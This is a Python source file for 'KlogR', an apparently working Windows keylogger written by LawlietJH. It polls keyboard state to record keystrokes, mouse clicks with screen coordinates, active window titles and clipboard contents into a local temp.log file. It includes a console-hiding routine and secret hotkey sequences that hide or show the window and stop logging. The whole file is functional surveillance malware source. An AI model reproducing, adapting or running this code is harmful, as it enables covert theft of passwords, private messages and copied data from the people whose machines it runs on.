# Tested in: Python 3.8.8 - Windows
# By: LawlietJH
# KlogR v1.1.0

import os, sys
largs = len(sys.argv)
# ~ if largs == 1: os.system("mode con: cols=16 lines=1")

import win32console    as WCS
import win32gui        as WG
# ~ if largs == 1: WG.ShowWindow(WCS.GetConsoleWindow(), False)
import win32api        as WA
import win32con        as WC  # All Constants
import win32clipboard  as WCB
from win32com.client import Dispatch

import string
import time

#-----------------------------------------------------------------------
#-----------------------------------------------------------------------
#-----------------------------------------------------------------------

def hideConsole(xD=True):												# Oculta/Desoculta la consola de comandos
	WG.ShowWindow(WCS.GetConsoleWindow(), not xD)

def getWindowRect(hwnd):												# Obtiene las dimensiones y posicion de la ventana
	rect = WG.GetWindowRect(hwnd)
	x, y = rect[:2]
	w = rect[2] - x
	h = rect[3] - y
	return (x, y, w, h)

def setTopMostConsole(topMost=True):									# Coloca al frente la consola de comandos y la fija.
	hwnd = WCS.GetConsoleWindow()
	if topMost:
		WG.SetWindowPos(hwnd, WC.HWND_TOPMOST, *getWindowRect(hwnd), 0)
	else:
		WG.SetWindowPos(hwnd, WC.HWND_NOTOPMOST, *getWindowRect(hwnd), 0)

def getNameActiveWindow():												# Obtiene el nombre de la ventana activa
	return WG.GetWindowText(WG.GetForegroundWindow())

def getPathFromWinExplorer():											# Obtiene la ruta actual del explorador de archivos abierto
	shell = Dispatch("Shell.Application")
	for win in shell.Windows():
		if win.Name == 'Explorador de archivos':
			return (win.LocationURL, win.LocationName, win.ReadyState)

class Clipboard:														# Manipula el clipboard (Copiar/Pegar)
	
	# print(Clipboard.text)												# Pegar: Devuelve el contenido que se haya copiado.
	@property
	def text(self):
		WCB.OpenClipboard()
		try:
			text = WCB.GetClipboardData()
			WCB.CloseClipboard()
			return text
		except TypeError:
			return ''

class Keyboard:															# Controla eventos del Teclado
	
	def __init__(self):
		
		# Giant dictonary to hold key name and VK value
		# http://www.kbdedit.com/manual/low_level_vk_list.html
		# https://gist.github.com/chriskiehl/2906125
		self.VK = {
			'left button': 0x01,
			'right button': 0x02,
			'middle button': 0x04,
			'x button 1': 0x05,
			'x button 2': 0x06,
			'backspace': 0x08,
			'tab': 0x09,
			'clear': 0x0C,
			'enter': 0x0D,
			'shift': 0x10,
			'ctrl': 0x11,
			'alt': 0x12,
			'pause': 0x13,
			'caps lock': 0x14,
			'esc': 0x1B,
			'spacebar': 0x20,
			' ': 0x20,
			'page up': 0x21,
			'page down': 0x22,
			'end': 0x23,
			'home': 0x24,
			'left arrow': 0x25,
			'up arrow': 0x26,
			'right arrow': 0x27,
			'down arrow': 0x28,
			'select': 0x29,
			'print': 0x2A,
			'execute': 0x2B,
			'print screen': 0x2C,
			'ins': 0x2D,
			'del': 0x2E,
			'help': 0x2F,
			'windows': 0x5B,
			'sleep': 0x5F,
			'0': 0x30,
			'1': 0x31,
			'2': 0x32,
			'3': 0x33,
			'4': 0x34,
			'5': 0x35,
			'6': 0x36,
			'7': 0x37,
			'8': 0x38,
			'9': 0x39,
			'a': 0x41,
			'b': 0x42,
			'c': 0x43,
			'd': 0x44,
			'e': 0x45,
			'f': 0x46,
			'g': 0x47,
			'h': 0x48,
			'i': 0x49,
			'j': 0x4A,
			'k': 0x4B,
			'l': 0x4C,
			'm': 0x4D,
			'n': 0x4E,
			'o': 0x4F,
			'p': 0x50,
			'q': 0x51,
			'r': 0x52,
			's': 0x53,
			't': 0x54,
			'u': 0x55,
			'v': 0x56,
			'w': 0x57,
			'x': 0x58,
			'y': 0x59,
			'z': 0x5A,
			'numpad 0': 0x60,
			'numpad 1': 0x61,
			'numpad 2': 0x62,
			'numpad 3': 0x63,
			'numpad 4': 0x64,
			'numpad 5': 0x65,
			'numpad 6': 0x66,
			'numpad 7': 0x67,
			'numpad 8': 0x68,
			'numpad 9': 0x69,
			'multiply key': 0x6A,
			'add key': 0x6B,
			'separator key': 0x6C,
			'subtract key': 0x6D,
			'decimal key': 0x6E,
			'divide key': 0x6F,
			'f1': 0x70,
			'f2': 0x71,
			'f3': 0x72,
			'f4': 0x73,
			'f5': 0x74,
			'f6': 0x75,
			'f7': 0x76,
			'f8': 0x77,
			'f9': 0x78,
			'f10': 0x79,
			'f11': 0x7A,
			'f12': 0x7B,
			'f13': 0x7C,
			'f14': 0x7D,
			'f15': 0x7E,
			'f16': 0x7f,
			'f17': 0x80,
			'f18': 0x81,
			'f19': 0x82,
			'f20': 0x83,
			'f21': 0x84,
			'f22': 0x85,
			'f23': 0x86,
			'f24': 0x87,
			'num lock': 0x90,
			'scroll lock': 0x91,
			'left shift': 0xA0,
			'right shift': 0xA1,
			'left control': 0xA2,
			'right control': 0xA3,
			'left menu': 0xA4,
			'right menu': 0xA5,
			'browser back': 0xA6,
			'browser forward': 0xA7,
			'browser refresh': 0xA8,
			'browser stop': 0xA9,
			'browser search': 0xAA,
			'browser favorites': 0xAB,
			'browser start and home': 0xAC,
			'volume mute': 0xAD,
			'volume down': 0xAE,
			'volume up': 0xAF,
			'next track': 0xB0,
			'previous track': 0xB1,
			'stop media': 0xB2,
			'play/pause media': 0xB3,
			'start mail': 0xB4,
			'select media': 0xB5,
			'start application 1': 0xB6,
			'start application 2': 0xB7,
			'attn key': 0xF6,
			'crsel key': 0xF7,
			'exsel key': 0xF8,
			'play key': 0xFA,
			'zoom key': 0xFB,
			'clear key': 0xFE,
			'<': 0xE2,
			# Por Defecto:
			# ~ '+': 0xBB,
			# ~ ',': 0xBC,
			# ~ '-': 0xBD,
			# ~ '.': 0xBE,
			# ~ '/': 0xBF,
			# ~ '`': 0xC0,
			# ~ ';': 0xBA,
			# ~ '[': 0xDB,
			# ~ '\\': 0xDC,
			# ~ ']': 0xDD,
			# ~ "'": 0xDE
			# Teclado: Español (España)
			'º': 0xDC,
			'\'': 0xDB,
			'¡': 0xDD,
			'`': 0xBA,
			'+': 0xBB,
			'ç': 0xBF,
			'ñ': 0xC0,
			'´': 0xDE,
			',': 0xBC,
			'.': 0xBE,
			'-': 0xBD
			# Teclado: Español (México)
			# ~ '|': 0xDC,
			# ~ '\'': 0xDB,
			# ~ '¿': 0xDD,
			# ~ '´': 0xBA,
			# ~ '+': 0xBB,
			# ~ '}': 0xBF,
			# ~ 'ñ': 0xC0,
			# ~ '{': 0xDE,
			# ~ ',': 0xBC,
			# ~ '.': 0xBE,
			# ~ '-': 0xBD
		}
	
	def getKeyState(self, vk=''):
		return WA.GetKeyState(self.VK[vk.lower()])

class Mouse:															# Controla eventos del Mouse
	
	# print(Mouse.position)
	@property
	def position(self):											# Devuelve la posición actual del cursor en pantalla en (X, Y) pixeles
		return WA.GetCursorPos()

class Klog:
	
	def __init__(self, maxColsLimit=256, itersPerSecond=60):
		
		# Clases: ------------------------------------------------------
		
		self.Clipboard = Clipboard()
		self.Keyboard = Keyboard()
		self.Mouse = Mouse()
		
		# Key Lists: ---------------------------------------------------
		
		self.keyList = [
			'Left Button',
			'Right Button',
			'Middle Button',
			'X Button 1',
			'X Button 2',
			'Backspace',
			'Tab',
			'Clear',
			'Enter',
			'Ctrl',
			'Alt',
			'Pause',
			# ~ 'Caps Lock',
			'Esc',
			# ~ 'Spacebar',
			'Page Up',
			'Page Down',
			'End',
			'Home',
			'Left Arrow',
			'Up Arrow',
			'Right Arrow',
			'Down Arrow',
			'Select',
			'Print',
			'Execute',
			'Print Screen',
			'Ins',
			'Del',
			'Help',
			'Windows',
			
			'Multiply Key',
			'Add Key',
			'Separator Key',
			'Subtract Key',
			'Decimal Key',
			'Divide Key',
			*['F'+str(i) for i in range(1, 25)],
			'Num Lock',
			'Scroll Lock',
			'Left Shift',
			'Right Shift',
			# ~ 'Left Control',
			# ~ 'Right Control',
			'Left Menu',
			'Right Menu',
			'Browser Back',
			'Browser Forward',
			'Browser Refresh',
			'Browser Stop',
			'Browser Search',
			'Browser Favorites',
			'Browser Start And Home',
			'Volume Mute',
			'Volume Down',
			'Volume Up',
			'Next Track',
			'Previous Track',
			'Stop Media',
			'Play/Pause Media',
			'Start Mail',
			'Select Media',
			'Start Application 1',
			'Start Application 2',
			
			'Attn Key',
			'Crsel Key',
			'Exsel Key',
			'Play Key',
			'Zoom Key',
			'Clear Key'
		]
		
		self.specialAdd = {
			'Backspace':     'Bs',
			'Left Arrow':    'LD',
			'Up Arrow':      'UD',
			'Right Arrow':   'RD',
			'Down Arrow':    'DD',
			'Left Button':   'LB',
			'Right Button':  'RB',
			'Middle Button': 'MB',
			'X Button 1':    'XB1',
			'X Button 2':    'XB2',
			'Left Menu':     'LM',
			'Right Menu':    'RM',
			'Left Shift':    'Shift',
			'Right Shift':   'R Shift',
			'Windows':       'Win'
		}
		
		self.numpad = ['numpad '+str(i) for i in range(10)]
		# ~ self.signs = ' ;+,-./`[\\]\'<' + string.digits				# Por defecto
		self.signs = ' º\'¡`+çñ´,.-<' + string.digits					# Teclado en Español (España)
		
		self.curDist = 'Español (España)'
		# ~ self.curDist = 'Inglés (Estados Unidos)'
		self.dist = {
			'Español (España)': {
				'Shift': {
					'º': 'ª',
					'1': '!',
					'2': '"',
					'3': '·',
					'4': '$',
					'5': '%',
					'6': '&',
					'7': '/',
					'8': '(',
					'9': ')',
					'0': '=',
					'\'': '?',
					'¡': '¿',
					'`': '^',
					'+': '*',
					'ç': 'Ç',
					'ñ': 'Ñ',
					'´': '¨',
					',': ';',
					'.': ':',
					'-': '_',
					'<': '>'
				},
				'Alt Gr': {
					'º': '\\',
					'1': '|',
					'2': '@',
					'3': '#',
					'4': '~',
					'5': '€',
					'6': '¬',
					'E': '€',
					'e': '€',
					'`': '[',
					'+': ']',
					'ç': '}',
					'´': '{'
				}
			},
			'Español (México)': {
				'Shift': {
					'º': '°',
					'1': '!',
					'2': '"',
					'3': '#',
					'4': '$',
					'5': '%',
					'6': '&',
					'7': '/',
					'8': '(',
					'9': ')',
					'0': '=',
					'\'': '?',
					'¡': '¡',
					'`': '¨',
					'+': '*',
					'ç': ']',
					'ñ': 'Ñ',
					'´': '[',
					',': ';',
					'.': ':',
					'-': '_',
					'<': '>'
				},
				'Alt Gr': {
					'º': '°',
					'\'': '\\',
					'+': '~',
					'ç': '`',
					'´': '^',
					'q': '@',
					'Q': '@'
				}
			},
			'Inglés (Estados Unidos)': {
				'Shift': {
					'º': '~',
					'1': '!',
					'2': '@',
					'3': '#',
					'4': '$',
					'5': '%',
					'6': '^',
					'7': '&',
					'8': '*',
					'9': '(',
					'0': ')',
					'\'': '_',
					'¡': '+',
					'`': '{',
					'+': '}',
					'ç': '|',
					'ñ': ':',
					'´': '"',
					',': '<',
					'.': '>',
					'-': '?',
					'<': '|'
				},
				'Alt Gr': {}
			}
		}
		
		# Variables: ---------------------------------------------------
		
		self.keysPressedLower = []
		self.keysPressedUpper = []
		self.keysPressedOther = []
		
		self.backdoors = [
			'<R Shift+Alt Gr+Alt+Ctrl+Shift>',
			'<R Shift+Alt Gr+Alt+Win+Ctrl>',
			'<Ctrl+Shift+LB(0,0)+RB(0,0)>',
			'<Ctrl+Shift+RB(0,0)+LB(0,0)>',
			'0xWord',
			'ZioN'
		]
		
		self.commands = {
			'CMDH': '<R Shift+Alt Gr+C+M+D+H>',
			'CMDS': '<R Shift+Alt Gr+C+M+D+S>',
			'ZION': '<R Shift+Alt Gr+Z+I+O+N>'
		}
		
		self.maxColsLimit = maxColsLimit
		self.ips = itersPerSecond
		
		self.shortcut = False
		self.init = True
	
	def _commands(self, output):
		if   output == self.commands['CMDH']: hideConsole(True)
		elif output == self.commands['CMDS']: hideConsole(False)
		elif output == self.commands['ZION']: sys.exit()
	
	def _forLetters(self, case, output, _type, keysPressed1, keysPressed2):
		letType = ''
		for let in case:											# Extrae letra por letra.
			letType = let.upper() if _type == 'U' else let.lower()
			if letType in keysPressed2:								# Esto evitará que se dupliquen letras: Verifica si la letra ya esta en la lista de letras presionadas.
				pos = keysPressed2.index(letType)					# Busca en que posicion de la lista se encuentra esa letra
				keysPressed2.pop(pos)								# Quita de la lista la letra en esa posicion
				keysPressed1.append(let)							# añade a la lista la letra como indicador de que ya estaba siendo presionada desde antes, esto evita duplicarla.
				continue											# Omite la iteración y continua a la siguiente
			if self.Keyboard.getKeyState(let) < 0 \
			and not let in keysPressed1:							# Si se esta presionando la letra y si la letra no esta en la lista
				keysPressed1.append(let)							# Se agrega a la lista
				if self.shortcut:
					output += '+' + let.upper()						# Se agrega el simbolo + y la letra en mayuscula
				else:
					output += let									# Se agrega al output
			elif self.Keyboard.getKeyState(let) >= 0 \
			and let in keysPressed1:								# Si no se presiona la letra y esta en la lista
				pos = keysPressed1.index(let)						# Se obtiene la posicion de la letra en la lista
				keysPressed1.pop(pos)								# Se quita de la lista
		return output, keysPressed1, keysPressed2
	
	def _forOthers(self, output):
		
		for let in self.keyList + self.numpad + list(self.signs):
			if self.Keyboard.getKeyState(let) < 0 \
			and not let in self.keysPressedOther:
				self.keysPressedOther.append(let)
				if let in self.specialAdd:
					if self.specialAdd[let] in ['LB','RB','MB']:
						pos = self.Mouse.position
						output += '<' + self.specialAdd[let] + '({},{})'.format(*pos) + '>'
					else:
						output += '<' + self.specialAdd[let] + '>'
				elif let in self.keyList:
					output += '<' + let + '>'
				elif let in self.numpad:
					output += let[-1]
				else:
					if let in self.signs:
						if self.shortcut:
							output += '+' + let
						else:
							output += let
					else:
						output += '<' + let + '>'
			elif self.Keyboard.getKeyState(let) >= 0 \
			and let in self.keysPressedOther:
				if let in self.specialAdd:
					if self.specialAdd[let] in ['LB','RB','MB']:
						pos = self.Mouse.position
						if not output.endswith('({},{})'.format(*pos) + '>'):
							output = output[:-1] + '({},{})'.format(*pos) + '>'
				pos = self.keysPressedOther.index(let)
				self.keysPressedOther.pop(pos)
		
		return output
	
	def _replaces(self, output):
		
		# ~ print(output)
		k_shift  = '<Shift>'
		k_rshift = '<R Shift>'
		k_altgr  = '<Ctrl><Alt><RM>'
		
		output = output.replace('<RM+Ctrl+Alt>', k_altgr)
		
		if not output == k_shift and (output.startswith(k_shift) and not output.startswith(k_shift+'<')):
			temp = output[len(k_shift):]
			for k, v in self.dist[self.curDist]['Shift'].items():
				temp = temp.replace(k, v)
			output = output[:len(k_shift)] + temp
		elif not output == k_rshift and (output.startswith(k_rshift) and not output.startswith(k_rshift+'<')):
			temp = output[len(k_rshift):]
			for k, v in self.dist[self.curDist]['Shift'].items():
				temp = temp.replace(k, v)
			output = output[:len(k_rshift)] + temp
		elif not output == k_altgr and (output.startswith(k_altgr) and not output.startswith(k_altgr+'<')):
			temp = output[len(k_altgr)+1::2]
			for k, v in self.dist[self.curDist]['Alt Gr'].items():
				temp = temp.replace(k, v)
			output = output[:len(k_altgr)+1] + temp
		
		if self.shortcut:
			if not output == k_shift and (output.startswith(k_shift) and not output.startswith(k_shift+'<')):
				output = output[len('<Shift>+'):]
				output = output.replace('+','')
			elif not output == k_rshift and (output.startswith(k_rshift) and not output.startswith(k_rshift+'<')):
				output = output[len('<R Shift>+'):]
				output = output.replace('+','')
			elif not output == k_altgr and (output.startswith(k_altgr) and not output.startswith(k_altgr+'<')):
				output = output[len('<Ctrl><Alt><RM>+'):]
				output = output.replace('+','')
			else:
				if not output.endswith('>'):
					output += '>'
			output = output.replace('<Alt><LM>', '<Alt>')
			output = output.replace('<Ctrl><Alt><RM>', '<Alt Gr>')
			output = output.replace('><', '+')
			output = output.replace('>+', '+')
		else:
			if '<Shift>' in output or '<R Shift>' in output or '<F' in output:
				output = output.replace('><', '+')
			
			if not output == '<Shift>':
				output = output.replace('<Shift>', '')
			
			if not output == '<R Shift>':
				output = output.replace('<R Shift>', '')
		
		return output
	
	def _isShortcut(self):
		
		mayus = self.Keyboard.getKeyState('Right Shift') < 0
		mayus = mayus or self.Keyboard.getKeyState('Left Shift') < 0
		mayus = not mayus if self.Keyboard.getKeyState('Caps Lock') == 1 else mayus
		
		ctrlL = self.Keyboard.getKeyState('Left Control')  < 0
		ctrlR = self.Keyboard.getKeyState('Right Control') < 0
		
		k_shift = mayus
		k_ctrl = ctrlL or ctrlR
		k_win = self.Keyboard.getKeyState('Windows') < 0
		k_alt = self.Keyboard.getKeyState('Alt') < 0
		k_del = self.Keyboard.getKeyState('Del') < 0
		k_esc = self.Keyboard.getKeyState('Esc') < 0
		
		k_shr = (k_ctrl or k_win or k_alt or k_del or k_esc)
		
		if self.init and (k_shr or (k_shift and k_shr)):
			self.shortcut = True
			self.init = False
		
		return mayus
	
	def _getKeys(self, output):
		
		mayus = self._isShortcut()
		
		if mayus:
			upper = string.ascii_uppercase
			res = self._forLetters(upper, output, 'L', self.keysPressedUpper, self.keysPressedLower)
			output, self.keysPressedUpper, self.keysPressedLower = res
		else:
			lower = string.ascii_lowercase
			res = self._forLetters(lower, output, 'U', self.keysPressedLower, self.keysPressedUpper)
			output, self.keysPressedLower, self.keysPressedUpper = res
		
		output = self._forOthers(output)
		
		return output
	
	def _keylogger(self):
		
		self.shortcut = False
		self.init = True
		output = ''
		
		while True:
			
			output = self._getKeys(output)
			
			if  not self.keysPressedLower \
			and not self.keysPressedUpper \
			and not self.keysPressedOther \
			and output: break
			
			time.sleep(1/self.ips)
		
		output = self._replaces(output)
		
		return output
	
	def run(self):
		
		with open('temp.log', 'a') as f:
			f.write('\n\n----------------------------------------------------')
			f.write('----------------------------------------------------')
			f.write('\n\n By: Lawliet JH')
			f.write('\n ' + __title__ + ' ' + __version__)
			activeWindow = getNameActiveWindow()
			f.write('\n\n [+] Active Window: ' + activeWindow)
			f.write('\n\n')
		
		clip = ''
		lenOutput = 0
		
		while True:
			
			output = self._keylogger()
			
			if output in self.backdoors:
				break
			
			self._commands(output)
			
			lenOutput += len(output)
			
			print(output)
			
			with open('temp.log', 'a') as f:
				
				newActiveWindow = getNameActiveWindow()
				
				if not activeWindow == newActiveWindow:
					
					activeWindow = newActiveWindow
					f.write('\n\n----------------------------------------------------')
					f.write('--------------------------')
					path = getPathFromWinExplorer()
					
					if path:
						if activeWindow == path[1]:
							f.write('\n\n [+] Active Window: ' + path[0])
						else:
							f.write('\n\n [+] Active Window: ' + activeWindow)
					else:
						f.write('\n\n [+] Active Window: ' + activeWindow)
					f.write('\n\n')
				
				if len(clip) < 1024 and not clip == self.Clipboard.text:
					clip = self.Clipboard.text
					try:
						f.write('\n\n [+] Clipboard:\n"""\n' + clip + '\n"""')
						f.write('\n\n')
					except:
						pass
				
				f.write(output)
				if lenOutput > self.maxColsLimit:
					f.write('\n')
					lenOutput = 0

#-----------------------------------------------------------------------
#-----------------------------------------------------------------------
#-----------------------------------------------------------------------

__title__ = 'KlogR'
__version__ = 'v1.1.0'

if largs == 1: setTopMostConsole()

if largs == 2:
	if sys.argv[1] == '-v':
		print(__title__+' '+__version__)
else:
	klog = Klog()
	klog.run()

#-----------------------------------------------------------------------
#-----------------------------------------------------------------------
#-----------------------------------------------------------------------






